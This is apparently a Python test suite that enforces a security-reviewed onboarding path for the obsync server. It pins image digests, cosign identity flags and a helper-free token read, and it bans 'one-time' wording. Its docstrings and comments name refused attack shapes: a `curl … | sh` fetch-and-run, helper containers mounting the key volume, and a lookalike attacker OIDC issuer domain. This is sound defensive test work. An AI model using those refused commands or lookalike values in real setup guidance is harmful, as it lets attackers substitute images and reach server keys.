"""The onboarding path is a security surface. This pins the repaired shape.

WHY. A security review of the first release train found three things wrong with
the way README.md told a stranger to start: it ran the server by the MUTABLE
tag `ghcr.io/snaraj/obsync:v0.1.0` after telling the reader to verify a
signature, so the bytes verified and the bytes run were two different
decisions; it read the setup token with a networked helper container mounting
the journal volume read-write, which hands a third-party image the volume that
holds the server key; and it called the token "one-time", which is false --
the token creates the account once and then REMAINS a standing sign-in to the
dashboard, where it reaches every administrative action the dashboard offers,
revoking a device among them. Every one of
those was fixed in prose. Then the repair was reverted in a scratch copy as an
experiment, and all 146 contract tests stayed green: nothing in this repository
knew the difference. Prose that is a security control needs a control.

WHAT IS REFUSED, and why each one is the security property rather than a style
preference:

  1. digest-only runs -- every command that starts a container in either
     document (`docker run`, `docker container run`, `docker create`,
     `docker container create`) must run `ghcr.io/snaraj/obsync@sha256:…`. A
     tag is a mutable pointer: the signature the reader just checked says
     nothing about what the tag will resolve to a second later, so a tag run
     silently discards the entire verification step above it. The same rule
     refuses a HELPER image by construction, because a helper is one of those
     commands naming something else.

  2. the two cosign flags, verbatim -- `cosign verify` without
     `--certificate-identity` and `--certificate-oidc-issuer` accepts a
     signature from ANY identity in ANY OIDC issuer, which is not a weaker
     check, it is no check. The exact strings are pinned because a plausible
     near-miss (a different workflow path, a different ref) is exactly what an
     attacker who can publish would want the reader to paste.

  3. the tokenless token read -- the README's `docker cp <name>:… - | tar -xO`
     must survive as something the reader can RUN: a top-level, unconditional
     pipeline of exactly that copy and that extraction. It reads the
     credential through the daemon, with no second image, no network, and no
     write access to the journal volume. Text that merely contains it does not
     count; `false && docker cp …` and `sh -c 'docker cp …'` are both a quick
     start that no longer reads the token.

  4. no journal volume anywhere else -- the name `obsync-journal` may stand in
     exactly two commands: `docker volume create obsync-journal`, and the
     server's own digest-pinned run. In any other command ANY token carrying
     that name is refused -- `-v obsync-journal:/j`, `-v=…`, `--volume …`,
     `--volume=…`, `--mount type=volume,source=…`, `--mount=…`, and every
     spelling nobody has written yet. That volume holds the generated server
     key and the setup token; handing it to anything else is the
     helper-container hole re-opened under a different name.

  5. no "one-time" near "setup token" -- in the same sentence, in any of the
     four places a person READS that wording: README.md, docs/architecture.md,
     the plugin's settings tab (`plugin/src/ui/settings.ts`) and the
     dashboard's sign-in page (`dashboard/index.html`). The word tells the
     reader the credential is spent after first use, so they stop protecting
     it. It is the single most dangerous word that has appeared in this
     onboarding path, and the rule was worth much less while it watched the
     two documents nobody reads at the moment they hold the token and neither
     of the two screens that hand it to them. The last two are not markdown;
     the sentence reader treats their unbroken runs of lines as one paragraph,
     which can only JOIN sentences that were separate and so can only make
     this rule refuse more, never less.

  6. the standing-credential sentence -- README.md's quick start must still
     say the token "remains the dashboard's recovery sign-in", and
     architecture.md section 4.1 must still say where it is written, that it
     is never logged, that it creates the account, and that it remains the
     recovery sign-in. Refusing the wrong word (rule 5) without requiring the
     right sentence leaves "delete the paragraph" as a way to go green.

  7. `OBSYNC_IMAGE` is a digest reference wherever it is SET -- the compose
     path in README.md supplies the image through that variable instead of
     writing it on a `docker run` line, so rule 1 never sees it. Every
     `OBSYNC_IMAGE=<value>` in either document, fenced or not, must be a
     `ghcr.io/snaraj/obsync@sha256:…` reference. Without this the whole
     signature verification is discarded by one variable.

  8. the compose file runs the variable and nothing else -- the `obsync`
     service's `image:` must be exactly `${OBSYNC_IMAGE}`, so the bytes the
     reader verified are the bytes that run and a literal reference can never
     be committed here to drift out of date. Every OTHER service (the TLS
     terminator) must be a digest with no tag: `latest`, `2`, `2.10` and every
     other mutable pointer is refused. The file is read with `miniyaml`, this
     repository's fail-closed reader, so a compose file this suite cannot
     resolve is a refusal and never a pass.

  9. the quick start runs an ALLOWLISTED program -- every command in
     `## Get syncing`, after wrappers are stripped and `sh -c` is recursed
     into, must start with `docker`, `cosign` or `tar`. This is the rule that
     closes script indirection: `bash deploy/helper.sh`, `./setup.sh`,
     `python3 -c …` and `curl -fsSL … | sh` all run code this contract cannot
     read, so no rule above can say anything about what they do. The list is
     three programs long and every addition is a reviewed edit to this file.

 10. compose starts containers too -- `docker compose run`, `exec` and
     `create` start a container from a SERVICE, so rule 1's image walk never
     sees them. `run` and `create` may not name the journal volume on their
     command line, and every `docker compose up` or `run` in README.md must
     carry the `OBSYNC_IMAGE=ghcr.io/snaraj/obsync@sha256:…` assignment on
     that same command: a compose invocation with no pinned image inherits
     whatever the reader's shell happens to hold.

 11. the compose path names the interface it is published on -- every
     `docker compose up` and `run` in README.md must also carry an
     `OBSYNC_BIND_ADDRESS=` assignment on that command, and its value may
     never be `0.0.0.0`. A port mapping with no host address publishes on
     every address the host has, and a private DNS name with a private
     certificate authority controls what the service is CALLED and who
     TRUSTS it, never who can reach it: a client anywhere can choose the
     name itself and skip verification. The documented command is therefore
     the place the choice is made, and `0.0.0.0` -- a real option, and the
     one that exposes the deployment wherever the host is reachable -- is
     not the one a reader copies out of an install guide. The PROSE may name
     it, and does; only a command may not carry it.

FAIL-CLOSED PARSING, OVER EXECUTABLE STRUCTURE. The first version of this file
judged text: it split a line on shell operators and searched the result with
regular expressions. An adversarial review walked straight through it with two
lines of ordinary shell -- the promised read behind a `false &&` that never
runs it, and a long-form `docker container run` handing a third-party image the
journal volume through `--mount` -- and every rule stayed green. So each fenced
line is now tokenized into what a shell would RUN: pipelines, the operator
before each one, and the commands inside each one, with `NAME=value` prefixes
and the `sudo`/`env`/`exec`/`command`/`nohup`/`time`/`nice` wrappers stripped
and `sh -c STRING` parsed recursively as its own line.

Every command is judged wherever it stands, reachable or not, because a reader
copies text out of a fenced block and pastes it. Reachability is recorded and
decides exactly one thing: whether the safe read the quick start PROMISES is a
command the reader can actually run.

The image of a container-starting command is found by walking its flags, and a
flag not in `VALUE_FLAGS` is treated as a boolean. A future flag that takes a
SEPARATE value would therefore make its value look like the image and this
suite would refuse the line. That direction is deliberate: the refusal names
the flag and the fix is one entry in `VALUE_FLAGS`, whereas guessing the other
way would let a helper run past. A line that will not tokenize -- an unbalanced
quote, an operator this reader does not model -- is refused too, if it mentions
`docker` or `cosign` at all.

EVERY RULE HAS A NEGATIVE TEST. `MutatedDocumentsAreRefused` re-runs the same
functions over the real text with one property broken -- in memory, never on
disk -- so a rule that stopped being able to fail fails here instead.
"""

from __future__ import annotations

import re
import shlex
import sys
import unittest
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import miniyaml  # noqa: E402

ROOT = Path(__file__).resolve().parents[2]
README = ROOT / "README.md"
ARCHITECTURE = ROOT / "docs" / "architecture.md"
COMPOSE = ROOT / "deploy" / "compose" / "docker-compose.yml"
SETTINGS = ROOT / "plugin" / "src" / "ui" / "settings.ts"
DASHBOARD = ROOT / "dashboard" / "index.html"
# The document names this suite judges. The first two are markdown and take the
# command and prose rules; the third is the compose file and takes rule 8.
README_NAME = "README.md"
ARCHITECTURE_NAME = "docs/architecture.md"
COMPOSE_NAME = "deploy/compose/docker-compose.yml"
SETTINGS_NAME = "plugin/src/ui/settings.ts"
DASHBOARD_NAME = "dashboard/index.html"
MARKDOWN = (README_NAME, ARCHITECTURE_NAME)
# Rule 5's document set: everywhere a person reads the words "setup token".
WORDING = (README_NAME, ARCHITECTURE_NAME, SETTINGS_NAME, DASHBOARD_NAME)

# The only image the onboarding path may run, and only ever by digest.
SERVER_IMAGE_PREFIX = "ghcr.io/snaraj/obsync@sha256:"
# Both are matched as a FLAG AND ITS WHOLE VALUE, never as a substring of the
# command text. `--certificate-oidc-issuer https://token.actions.
# githubusercontent.com.example.net` contains the correct issuer as a prefix
# and is an attacker-controlled domain; a substring check passes it, which is
# how a near-miss gets pasted. Written as (flag, value) pairs and compared
# against shell tokens, the near-miss is a different token and is refused.
CERTIFICATE_IDENTITY = (
    "--certificate-identity",
    "https://github.com/snaraj/obsync/.github/workflows/release-publisher.yml"
    "@refs/heads/main",
)
CERTIFICATE_ISSUER = (
    "--certificate-oidc-issuer",
    "https://token.actions.githubusercontent.com",
)


def flag_text(pair: tuple[str, str]) -> str:
    return f"{pair[0]} {pair[1]}"
# `<name>` is the reader's own container name, so the name itself is free.
TOKEN_PATH = ":/data/journal/v1/setup-token"
SAFE_READ = f"docker cp <name>{TOKEN_PATH} - | tar -xO"
JOURNAL_VOLUME = "obsync-journal"
RECOVERY_SENTENCE = "remains the dashboard's recovery sign-in"
# The same promise in architecture.md, which may or may not name the dashboard.
ARCHITECTURE_RECOVERY = re.compile(r"remains the (?:dashboard's )?recovery sign-in")
ONE_TIME = re.compile(r"one-time")
SETUP_TOKEN = re.compile(r"setup token")

# Docker flags that take a SEPARATE value. Anything else beginning with `-` is
# read as a boolean flag; see FAIL-CLOSED PARSING above.
VALUE_FLAGS = frozenset(
    {
        "-p", "--publish", "-v", "--volume", "--mount", "-e", "--env",
        "--env-file", "--name", "--network", "--net", "-u", "--user",
        "-w", "--workdir", "--entrypoint", "--restart", "-l", "--label",
        "--security-opt", "--cap-add", "--cap-drop", "--device", "--tmpfs",
        "--sysctl", "--add-host", "--pull", "--platform", "--memory", "-m",
        "--cpus", "--stop-signal", "--log-driver", "--health-cmd", "--hostname",
        "-h", "--ulimit", "--group-add",
    }
)

# One logical line is a list of PIPELINES; each pipeline is a list of commands;
# each pipeline records the operator that precedes it, because `false && cmd`
# and `cmd` are not the same promise to a reader. These five are the only
# operators this reader models: a run of punctuation that is not one of them
# (`;;`, `|&`) raises rather than being read as a word.
OPERATORS = frozenset({"|", "||", "&&", ";", "&"})
PUNCTUATION = frozenset("|&;")
# A pipeline preceded by nothing, `;` or `&` runs whatever happened before it.
UNCONDITIONAL = frozenset({None, ";", "&"})

# What a command may be WRAPPED in and still be that command. `FOO=1 docker run
# …`, `sudo docker run …` and `sh -c 'docker run …'` each run docker, and the
# reader who pastes any of them gets a container, so the contract judges the
# command inside rather than the wrapper outside.
ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
WRAPPERS = frozenset({"sudo", "env", "exec", "command", "nohup", "time", "nice"})
SHELLS = frozenset({"sh", "bash", "zsh", "dash"})
# The two programs this file has rules about; see `_strip_wrappers`.
JUDGED = frozenset({"docker", "cosign"})

# Every spelling that hands an image the mounts on its command line. `docker
# container run` is the long form of `docker run`, and `create` is `run`
# without the start -- the volume is attached either way.
IMAGE_VERBS = (
    ("docker", "container", "run"),
    ("docker", "container", "create"),
    ("docker", "run"),
    ("docker", "create"),
)
VOLUME_CREATE = ("docker", "volume", "create")

# Rule 7: the variable the compose path supplies the image through.
IMAGE_VARIABLE = re.compile(r"OBSYNC_IMAGE=(\S*)")
# Rule 8: what the compose file's `obsync` service must run, character for
# character, and what every other service must be pinned by.
COMPOSE_IMAGE = "${OBSYNC_IMAGE}"
DIGEST_REFERENCE = re.compile(r"^[a-z0-9][a-z0-9._/-]*@sha256:[0-9a-f]{64}$")
OBSYNC_SERVICE = "obsync"
# Rule 9. Three programs, and the reason the list is this short: every one of
# them is a command this file can READ to the end. A shell, an interpreter or a
# downloader hands the reader a program written somewhere this suite cannot
# see, and every rule above then says nothing about what actually runs.
QUICK_START_PROGRAMS = frozenset({"docker", "cosign", "tar"})
# Rule 10. `docker compose` flags that take a SEPARATE value, so the verb is
# found past them; anything else beginning with `-` is read as a boolean, the
# same fail-closed direction as VALUE_FLAGS above.
COMPOSE_VALUE_FLAGS = frozenset(
    {
        "-f", "--file", "-p", "--project-name", "--project-directory",
        "--env-file", "--profile", "--progress", "--parallel", "--ansi",
        "--project-name=", "--compatibility",
    }
)
# The compose verbs that start a container from a service. `up` is pinned to a
# digest (there is no volume on its command line to abuse); `run` and `create`
# take mounts and are held to the journal-volume rule as well.
COMPOSE_MOUNTING_VERBS = frozenset({"run", "create"})
COMPOSE_PINNED_VERBS = frozenset({"up", "run"})
# Rule 11: the host address the compose path publishes 80 and 443 on, and the
# one value for it that is an exposure decision rather than a choice of
# interface. `deploy/compose/docker-compose.yml` requires the variable with no
# default; this is the other half, so the documented command answers it.
BIND_ADDRESS_VARIABLE = "OBSYNC_BIND_ADDRESS"
EVERY_INTERFACE = "0.0.0.0"
VOLUME_FLAGS = frozenset({"-v", "--volume", "--mount"})


@dataclass(frozen=True)
class Pipeline:
    """What one pipeline runs, and what must succeed first for it to run."""

    operator: str | None
    commands: tuple[tuple[str, ...], ...]
    nested: bool
    # The words BEFORE `_strip_wrappers` ran, because rule 10 has to see the
    # `NAME=value` prefix that the stripping deliberately discards: whether a
    # `docker compose up` carries a pinned image is a fact about the prefix.
    raw: tuple[tuple[str, ...], ...] = ()

    @property
    def unconditional(self) -> bool:
        return self.operator in UNCONDITIONAL


def section(text: str, heading: str) -> str:
    """One markdown section, from its heading to the next one at that level."""
    level = heading.split(" ", 1)[0]
    start = text.find(heading + "\n")
    if start < 0:
        return ""
    body = text[start + len(heading) + 1 :]
    for line in body.splitlines(keepends=True):
        stripped = line.rstrip("\n")
        if stripped.startswith("#") and len(stripped.split(" ", 1)[0]) <= len(level):
            return body[: body.find(line)]
    return body


def logical_lines(text: str) -> list[str]:
    """Every fenced block's commands, backslash continuations joined."""
    lines: list[str] = []
    fenced = False
    pending = ""
    for raw in text.splitlines():
        if raw.startswith("```"):
            fenced = not fenced
            pending = ""
            continue
        if not fenced:
            continue
        stripped = raw.strip()
        if stripped.endswith("\\"):
            pending += stripped[:-1].strip() + " "
            continue
        joined = (pending + stripped).strip()
        pending = ""
        if joined:
            lines.append(re.sub(r"\s+", " ", joined))
    return lines


def _tokens(line: str) -> list[str]:
    """Shell words and operators, with `--flag=value` and a digest kept whole."""
    lexer = shlex.shlex(line, posix=True, punctuation_chars="|&;")
    lexer.whitespace_split = True
    # `#` is NOT a comment to this reader. A commented-out
    # `-v obsync-journal:/j` is still a line a reader can uncomment and paste,
    # and dropping it here would make rule 4 quieter than the regex it replaced.
    lexer.commenters = ""
    return list(lexer)


def _split(line: str) -> list[tuple[str | None, list[tuple[str, ...]]]]:
    """(preceding operator, commands) for every pipeline in one logical line."""
    found: list[tuple[str | None, list[tuple[str, ...]]]] = []
    operator: str | None = None
    commands: list[tuple[str, ...]] = []
    words: list[str] = []
    # The trailing `;` is a sentinel that closes the last pipeline; without it
    # the final command would be parsed and then dropped.
    for token in [*_tokens(line), ";"]:
        if token not in OPERATORS:
            if token and set(token) <= PUNCTUATION:
                raise ValueError(f"unmodelled shell operator {token!r}")
            words.append(token)
            continue
        if words:
            commands.append(tuple(words))
            words = []
        if token == "|":
            continue
        if commands:
            found.append((operator, commands))
            commands = []
        operator = token
    return found


def executable(line: str, nested: bool = False) -> list[Pipeline]:
    """Every command one logical line runs: wrappers off, `sh -c` recursed."""
    found: list[Pipeline] = []
    for operator, commands in _split(line):
        effective: list[tuple[str, ...]] = []
        for words in commands:
            command, script = _strip_wrappers(words)
            if command:
                effective.append(command)
            for inner in (script or "").splitlines():
                found.extend(executable(inner, nested=True))
        found.append(Pipeline(operator, tuple(effective), nested, tuple(commands)))
    return found


def _strip_wrappers(words: tuple[str, ...]) -> tuple[tuple[str, ...], str | None]:
    """The command a wrapped word list runs, and the script of `sh -c STRING`."""
    index = 0
    wrapped = False
    while index < len(words):
        if ASSIGNMENT.match(words[index]):
            index += 1
            continue
        if words[index] in WRAPPERS:
            wrapped = True
            index += 1
            while index < len(words) and words[index].startswith("-"):
                index += 1
            continue
        break
    command = tuple(words[index:])
    if wrapped and command and command[0] not in JUDGED and command[0] not in SHELLS:
        # A wrapper option that takes a SEPARATE value (`sudo -u root docker
        # run …`) leaves its value standing where the command name should be.
        # Re-anchor on the program this file judges rather than lose the
        # command: the direction is always MORE commands judged, never fewer.
        for position, word in enumerate(command):
            if word in JUDGED:
                command = command[position:]
                break
    if command and command[0] in SHELLS:
        return command, _script_of(command)
    return command, None


def _script_of(command: tuple[str, ...]) -> str | None:
    """The STRING of `sh -c STRING`, whatever letters the flag bundles (`-lc`)."""
    for index, word in enumerate(command[1:], start=1):
        if not word.startswith("-"):
            return None
        if "c" in word.lstrip("-"):
            return command[index + 1] if index + 1 < len(command) else None
    return None


def _is_the_safe_read(pipeline: Pipeline) -> bool:
    """A REACHABLE, top-level `docker cp <name>:…/setup-token - | tar -xO`.

    Structure, not substring. `false && docker cp …` carries the promised text
    and never runs it, and `sh -c '…'` runs it one level down where a reader
    following the prose is not looking. The shape that passes is exactly two
    commands -- the copy and the extraction -- in an unconditional pipeline of
    the quick start itself.
    """
    if pipeline.nested or not pipeline.unconditional or len(pipeline.commands) != 2:
        return False
    read, extract = pipeline.commands
    return (
        len(read) == 4
        and read[:2] == ("docker", "cp")
        and read[2].endswith(TOKEN_PATH)
        and read[3] == "-"
        and extract == ("tar", "-xO")
    )


def _reads_the_token(quick_start: str) -> bool:
    """At least one reachable safe read stands in the quick start."""
    return any(
        _is_the_safe_read(pipeline) for pipeline in _quick_start_pipelines(quick_start)
    )


def _quick_start_pipelines(quick_start: str) -> list[Pipeline]:
    found: list[Pipeline] = []
    for line in logical_lines(quick_start):
        try:
            found.extend(executable(line))
        except ValueError:
            continue
    return found


def _token_read_refusals(quick_start: str) -> list[str]:
    """Rule 3, over EVERY documented read rather than over the first one.

    The quick start reads the token twice now -- once from the container the
    `docker run` path creates, once from the container compose creates -- and
    "at least one of them is reachable" would let either be neutralized while
    the other kept the rule green. So every pipeline that names the token path
    must ITSELF be the safe read, and at least one must exist. A reader who
    followed the compose path and found `false && docker cp …` there is not
    consoled by a working command in the section above it.
    """
    found: list[str] = []
    reachable = 0
    for pipeline in _quick_start_pipelines(quick_start):
        if not any(
            TOKEN_PATH in word for command in pipeline.commands for word in command
        ):
            continue
        if _is_the_safe_read(pipeline):
            reachable += 1
            continue
        named = " | ".join(" ".join(command) for command in pipeline.commands)
        found.append(
            "README.md: the quick start no longer reads the setup token with "
            f"`{SAFE_READ}`: {named}"
        )
    starts = _server_starts(quick_start)
    if reachable < max(1, starts):
        found.append(
            "README.md: the quick start no longer reads the setup token with "
            f"`{SAFE_READ}` on every path that starts the server "
            f"({starts} starts, {reachable} reachable reads)"
        )
    return found


def _server_starts(quick_start: str) -> int:
    """How many ways the quick start starts the server.

    The floor above is tied to this rather than to a number written here:
    document a third install path and it must carry its own token read;
    delete one and the requirement drops with it. That is what keeps the rule
    behavioural. Both spellings count -- a `docker run` of the verified digest
    and a `docker compose up`, which starts it from a service.
    """
    count = 0
    for pipeline in _quick_start_pipelines(quick_start):
        for command in pipeline.commands:
            started = _started_image(command)
            if started is not None and (started[1] or "").startswith(
                SERVER_IMAGE_PREFIX
            ):
                count += 1
                continue
            verb = _compose_verb(command)
            if verb is not None and verb[0] == "up":
                count += 1
    return count


def _image_of(tokens: list[str]) -> str | None:
    """The image reference of `docker run <flags> IMAGE [command]`."""
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if not token.startswith("-"):
            return token
        if "=" in token or token not in VALUE_FLAGS:
            index += 1
        else:
            index += 2
    return None


def refusals(documents: dict[str, str]) -> list[str]:
    """Every refusal the onboarding contract raises over these documents."""
    found: list[str] = []
    for name in MARKDOWN:
        text = documents.get(name, "")
        if not text:
            continue
        found.extend(_command_refusals(name, text))
        found.extend(_image_variable_refusals(name, text))
        found.extend(_compose_command_refusals(name, text))
    for name in WORDING:
        text = documents.get(name, "")
        if text:
            found.extend(_prose_refusals(name, text))
    readme = documents.get(README_NAME, "")
    quick_start = section(readme, "## Get syncing")
    if not quick_start:
        found.append("README.md has no `## Get syncing` section")
    else:
        found.extend(_token_read_refusals(quick_start))
        if RECOVERY_SENTENCE not in quick_start:
            found.append(
                "README.md: the quick start no longer says the token "
                f"{RECOVERY_SENTENCE!r}"
            )
        found.extend(_program_refusals(quick_start))
    architecture = documents.get(ARCHITECTURE_NAME, "")
    if architecture:
        found.extend(_architecture_refusals(architecture))
    compose = documents.get(COMPOSE_NAME, "")
    if compose:
        found.extend(_compose_file_refusals(compose))
        found.extend(_image_variable_refusals(COMPOSE_NAME, compose))
    return found


def _image_variable_refusals(name: str, text: str) -> list[str]:
    """Rule 7: `OBSYNC_IMAGE` is a digest reference wherever it is SET.

    The whole raw document, not only its fenced blocks. A reader pastes what
    is in front of them, and the difference between a tag and a digest is the
    difference between running the bytes cosign verified and running whatever
    the tag points at now -- a distinction that does not become safe by being
    written in a sentence instead of a code block.
    """
    found: list[str] = []
    for match in IMAGE_VARIABLE.finditer(text):
        value = match.group(1)
        if not value.startswith(SERVER_IMAGE_PREFIX):
            found.append(
                f"{name}: OBSYNC_IMAGE is set to {value!r}, not "
                f"{SERVER_IMAGE_PREFIX}… (a tag, a helper image, or nothing)"
            )
    return found


def _program_refusals(quick_start: str) -> list[str]:
    """Rule 9: every command in the quick start runs an allowlisted program."""
    found: list[str] = []
    for line in logical_lines(quick_start):
        try:
            parsed = executable(line)
        except ValueError:
            # Already refused, by name, in `_command_refusals`.
            continue
        for pipeline in parsed:
            for command in pipeline.commands:
                if command[0] not in QUICK_START_PROGRAMS:
                    found.append(
                        f"README.md: the quick start runs {command[0]!r}, which is "
                        "not one of the programs it may run "
                        f"({', '.join(sorted(QUICK_START_PROGRAMS))}): "
                        f"{' '.join(command)}"
                    )
    return found


def _compose_verb(command: tuple[str, ...]) -> tuple[str, tuple[str, ...]] | None:
    """(the verb, the words after it) when this is `docker compose <verb> …`."""
    if command[:2] != ("docker", "compose"):
        return None
    index = 2
    while index < len(command):
        word = command[index]
        if not word.startswith("-"):
            return word, command[index + 1 :]
        index += 1 if "=" in word or word not in COMPOSE_VALUE_FLAGS else 2
    return None


def _names_journal_volume(words: tuple[str, ...]) -> bool:
    """A `-v`/`--volume`/`--mount` value naming the journal volume."""
    for index, word in enumerate(words):
        flag, separator, value = word.partition("=")
        if flag not in VOLUME_FLAGS:
            continue
        if not separator:
            value = words[index + 1] if index + 1 < len(words) else ""
        if JOURNAL_VOLUME in value:
            return True
    return False


def _assignments(words: tuple[str, ...]) -> dict[str, str]:
    """The `NAME=value` prefix `_strip_wrappers` discards, walked the same way."""
    found: dict[str, str] = {}
    index = 0
    while index < len(words):
        if ASSIGNMENT.match(words[index]):
            name, _, value = words[index].partition("=")
            found[name] = value
            index += 1
            continue
        if words[index] in WRAPPERS:
            index += 1
            while index < len(words) and words[index].startswith("-"):
                index += 1
            continue
        break
    return found


def _compose_command_refusals(name: str, text: str) -> list[str]:
    """Rule 10: the compose verbs that start a container from a service."""
    found: list[str] = []
    for line in logical_lines(text):
        try:
            parsed = executable(line)
        except ValueError:
            continue
        for pipeline in parsed:
            for words in pipeline.raw:
                command, _ = _strip_wrappers(words)
                verb = _compose_verb(command)
                if verb is None:
                    continue
                name_of_verb, rest = verb
                if name_of_verb in COMPOSE_MOUNTING_VERBS and _names_journal_volume(rest):
                    found.append(
                        f"{name}: `docker compose {name_of_verb}` mounts "
                        f"`{JOURNAL_VOLUME}` into a service: {' '.join(command)}"
                    )
                if name_of_verb not in COMPOSE_PINNED_VERBS:
                    continue
                assigned = _assignments(words)
                supplied = assigned.get("OBSYNC_IMAGE", "")
                if not supplied.startswith(SERVER_IMAGE_PREFIX):
                    found.append(
                        f"{name}: `docker compose {name_of_verb}` is not pinned to an "
                        f"OBSYNC_IMAGE={SERVER_IMAGE_PREFIX}… reference: "
                        f"{' '.join(command)}"
                    )
                # Rule 11. Absent and `0.0.0.0` are separate refusals because
                # they are separate mistakes: the first publishes on every
                # interface because nobody chose, the second because somebody
                # copied a line that chose it for them.
                if BIND_ADDRESS_VARIABLE not in assigned:
                    found.append(
                        f"{name}: `docker compose {name_of_verb}` carries no "
                        f"{BIND_ADDRESS_VARIABLE}= assignment, so the host address "
                        f"80 and 443 are published on is whatever the reader's "
                        f"shell holds: {' '.join(command)}"
                    )
                elif assigned[BIND_ADDRESS_VARIABLE] == EVERY_INTERFACE:
                    found.append(
                        f"{name}: `docker compose {name_of_verb}` publishes on "
                        f"{EVERY_INTERFACE}, every address this host has, which is an "
                        f"exposure decision and not a documented default: "
                        f"{' '.join(command)}"
                    )
    return found


def _compose_file_refusals(text: str) -> list[str]:
    """Rule 8: the obsync service runs the variable; everything else, a digest."""
    try:
        document = miniyaml.load_one(text)
    except miniyaml.YamlError as error:
        return [f"{COMPOSE_NAME}: cannot be resolved: {error}"]
    services = document.get("services") if isinstance(document, dict) else None
    if not isinstance(services, dict) or OBSYNC_SERVICE not in services:
        return [f"{COMPOSE_NAME}: has no `services.{OBSYNC_SERVICE}` mapping"]
    found: list[str] = []
    for service, body in services.items():
        image = body.get("image") if isinstance(body, dict) else None
        if service == OBSYNC_SERVICE:
            if image != COMPOSE_IMAGE:
                found.append(
                    f"{COMPOSE_NAME}: service `{service}` runs {image!r}, not "
                    f"`{COMPOSE_IMAGE}` (the image the reader verified)"
                )
            continue
        if not isinstance(image, str) or not DIGEST_REFERENCE.match(image):
            found.append(
                f"{COMPOSE_NAME}: service `{service}` runs {image!r}, which is "
                "not an @sha256 digest with no tag"
            )
    return found


def _command_refusals(name: str, text: str) -> list[str]:
    found: list[str] = []
    for line in logical_lines(text):
        try:
            parsed = executable(line)
        except ValueError:
            # A line this reader cannot resolve, that mentions either program
            # it judges, is refused rather than skipped: an unreadable line is
            # exactly where a helper run would be hidden.
            if "docker" in line or "cosign" in line:
                found.append(f"{name}: unparseable command: {line}")
            continue
        for pipeline in parsed:
            for command in pipeline.commands:
                found.extend(_one_command(name, command))
    return found


def _started_image(command: tuple[str, ...]) -> tuple[str, str | None] | None:
    """(the verb, the image) when this command starts a container from one."""
    for verb in IMAGE_VERBS:
        if command[: len(verb)] == verb:
            return " ".join(verb), _image_of(list(command[len(verb) :]))
    return None


def _one_command(name: str, command: tuple[str, ...]) -> list[str]:
    """The three command rules, applied to one command wherever it stands."""
    found: list[str] = []
    started = _started_image(command)
    server = started is not None and (started[1] or "").startswith(SERVER_IMAGE_PREFIX)
    if started is not None and not server:
        found.append(
            f"{name}: `{started[0]}` runs {started[1]!r}, not "
            f"{SERVER_IMAGE_PREFIX}… (a tag or a helper image)"
        )
    for word in command:
        if server or JOURNAL_VOLUME not in word:
            continue
        if command[: len(VOLUME_CREATE)] == VOLUME_CREATE and word == JOURNAL_VOLUME:
            continue
        found.append(
            f"{name}: `{JOURNAL_VOLUME}` is named by a command that is not the "
            f"server's own digest-pinned run: {' '.join(command)}"
        )
    if command[:2] == ("cosign", "verify"):
        for pair in (CERTIFICATE_IDENTITY, CERTIFICATE_ISSUER):
            if not _has_flag(command, pair):
                found.append(
                    f"{name}: `cosign verify` is missing `{flag_text(pair)}`"
                )
    return found


def _has_flag(tokens: tuple[str, ...], pair: tuple[str, str]) -> bool:
    """`--flag value` or `--flag=value`, both as WHOLE tokens."""
    flag, value = pair
    for index, token in enumerate(tokens):
        if token == f"{flag}={value}":
            return True
        if token == flag and tokens[index + 1 : index + 2] == (value,):
            return True
    return False


BLOCK_START = re.compile(r"^(?:#|```|\||>|[-*+]\s|\d+\.\s)")


def sentences(text: str) -> list[str]:
    """Prose sentences over a hard-wrapped markdown document.

    Two decisions worth stating. A SEMICOLON joins clauses and does not end a
    sentence, so "a one-time link; the setup token stays" is one sentence and
    rule 5 refuses it -- splitting there would be a quiet weakening. A HEADING,
    a list marker, a table row and a blank line all END the block, because a
    heading has no full stop and would otherwise glue itself to the paragraph
    below and report a sentence nobody wrote.
    """
    blocks: list[str] = []
    paragraph: list[str] = []
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped or BLOCK_START.match(stripped):
            if paragraph:
                blocks.append(" ".join(paragraph))
                paragraph = []
            if stripped and not stripped.startswith("```"):
                blocks.append(stripped)
            continue
        paragraph.append(stripped)
    if paragraph:
        blocks.append(" ".join(paragraph))
    found: list[str] = []
    for block in blocks:
        found.extend(part for part in re.split(r"(?<=[.!?]) ", block) if part.strip())
    return found


def _prose_refusals(name: str, text: str) -> list[str]:
    found = []
    for sentence in sentences(text):
        if SETUP_TOKEN.search(sentence) and ONE_TIME.search(sentence):
            found.append(
                f'{name}: "one-time" shares a sentence with "setup token": {sentence}'
            )
    return found


def _architecture_refusals(text: str) -> list[str]:
    first_device = section(text, "### 4.1 First device")
    if not first_device:
        return ["docs/architecture.md has no `### 4.1 First device` section"]
    found = []
    for phrase in ("journal volume", "never logged", "creates the account"):
        if phrase not in first_device:
            found.append(f"docs/architecture.md 4.1 no longer says {phrase!r}")
    if not ARCHITECTURE_RECOVERY.search(first_device):
        found.append(
            "docs/architecture.md 4.1 no longer says the token remains the "
            "recovery sign-in"
        )
    return found


def documents() -> dict[str, str]:
    return {
        README_NAME: README.read_text(encoding="utf-8"),
        ARCHITECTURE_NAME: ARCHITECTURE.read_text(encoding="utf-8"),
        COMPOSE_NAME: COMPOSE.read_text(encoding="utf-8"),
        SETTINGS_NAME: SETTINGS.read_text(encoding="utf-8"),
        DASHBOARD_NAME: DASHBOARD.read_text(encoding="utf-8"),
    }


class TheOnboardingPathHoldsItsRepairedShape(unittest.TestCase):
    """The real documents, as committed."""

    def test_the_documents_raise_no_refusal(self):
        self.assertEqual(refusals(documents()), [])

    def test_the_quick_start_runs_the_verified_digest(self):
        # Named separately from the aggregate above so a failure says WHICH
        # property broke without reading a list.
        quick_start = section(documents()["README.md"], "## Get syncing")
        self.assertIn(SERVER_IMAGE_PREFIX, quick_start)
        self.assertEqual(_command_refusals("README.md", quick_start), [])

    def test_the_quick_start_pins_both_cosign_identity_flags(self):
        quick_start = section(documents()["README.md"], "## Get syncing")
        flat = re.sub(r"\s*\\\n\s*", " ", quick_start)
        self.assertIn(flag_text(CERTIFICATE_IDENTITY), flat)
        self.assertIn(flag_text(CERTIFICATE_ISSUER), flat)

    def test_the_quick_start_reads_the_token_without_a_helper(self):
        quick_start = section(documents()["README.md"], "## Get syncing")
        self.assertTrue(_reads_the_token(quick_start), SAFE_READ)

